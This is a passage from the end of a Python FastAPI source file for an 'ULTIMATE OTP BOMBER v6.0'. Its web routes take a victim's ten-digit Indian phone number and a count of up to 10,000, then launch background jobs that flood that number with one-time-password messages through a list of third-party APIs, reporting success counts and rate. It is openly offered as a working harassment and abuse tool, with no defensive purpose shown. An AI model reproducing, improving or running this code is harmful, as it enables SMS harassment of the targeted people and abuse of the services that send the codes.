                rps = stats["total"] / elapsed if elapsed else 0
                print(f"\n[{job_id}] ✅ Cycle {cycle+1}/{count} | Total={stats['total']} | HTTP_OK={stats['http_ok']} | OTP={stats['otp_ok']} | Failed={stats['failed']} | {rps:.1f}/s\n")
                await asyncio.sleep(0.1)
    except Exception as e:
        print(f"[{job_id}] ❌ {e}")
    finally:
        _running_jobs.pop(job_id, None)
        print(f"[{job_id}] 🏁 DONE | Total={stats['total']} | OTP={stats['otp_ok']}")


# ═══════════════════════════════════════════════════════════
# 🌐 ROUTES
# ═══════════════════════════════════════════════════════════
@app.get("/", response_class=HTMLResponse)
async def root():
    return f"""<html><body style="font-family:monospace;background:#111;color:#0f0;padding:20px">
    <h1>🔥 ULTIMATE OTP BOMBER v6.0</h1>
    <p>APIs: <b>{len(ULTIMATE_APIS)}</b> | Workers: <b>{MAX_CONCURRENT}</b></p>
    <ul>
    <li><a href="/send?number=9876543210&count=5" style="color:#0ff">/send?number=9876543210&count=5</a></li>
    <li><a href="/stop?number=9876543210" style="color:#0ff">/stop?number=9876543210</a></li>
    <li><a href="/stats?number=9876543210" style="color:#0ff">/stats?number=9876543210</a></li>
    </ul></body></html>"""

@app.get("/health")
async def health():
    return {"status": "ok", "total_apis": len(ULTIMATE_APIS), "max_workers": MAX_CONCURRENT}

@app.get("/apis")
async def list_apis():
    return {"total": len(ULTIMATE_APIS), "apis": [a["name"] for a in ULTIMATE_APIS]}

@app.get("/send")
async def send_endpoint(bg: BackgroundTasks, number: str = Query(...), count: int = Query(1)):
    number = number.strip().replace("+","").replace(" ","").replace("-","")
    if not number.isdigit() or len(number) != 10:
        return JSONResponse({"success": False, "error": "Invalid number"}, 400)
    if count <= 0 or count > 10000:
        return JSONResponse({"success": False, "error": "count 1-10000"}, 400)

    job_id = str(uuid4())[:8]
    _running_jobs[job_id] = {"number": number, "count": count}
    bg.add_task(bomb_worker, job_id, number, count)

    return {"success": True, "job_id": job_id, "target": f"+91{number}", "count": count,
            "apis": len(ULTIMATE_APIS), "total_requests": count*len(ULTIMATE_APIS),
            "stop_url": f"/stop?number={number}", "stats_url": f"/stats?number={number}"}

@app.get("/stop")
async def stop_endpoint(number: str = Query(...)):
    number = number.strip().replace("+","").replace(" ","").replace("-","")
    _stop_numbers.add(number)
    return {"success": True, "message": f"🛑 Stop for +91{number}"}

@app.get("/stats")
async def stats_endpoint(number: str = Query(...)):
    number = number.strip().replace("+","").replace(" ","").replace("-","")
    s = _global_stats.get(number, {})
    if not s or not s.get("start"):
        return {"success": False, "error": "no stats"}
    elapsed = time.time() - s.get("start", time.time())
    return {"success": True, "number": f"+91{number}", "total": s.get("total",0),
            "http_ok": s.get("http_ok",0), "otp_ok": s.get("otp_ok",0),
            "failed": s.get("failed",0), "elapsed": round(elapsed,2),
            "rps": round(s["total"]/elapsed if elapsed else 0, 1)}


if __name__ == "__main__":
    print(f"\n🔥 ULTIMATE OTP BOMBER v6.0\n▸ APIs: {len(ULTIMATE_APIS)}\n▸ Workers: {MAX_CONCURRENT}\n▸ http://0.0.0.0:5000\n")
    uvicorn.run(app, host="0.0.0.0", port=5000, log_level="warning", access_log=False)
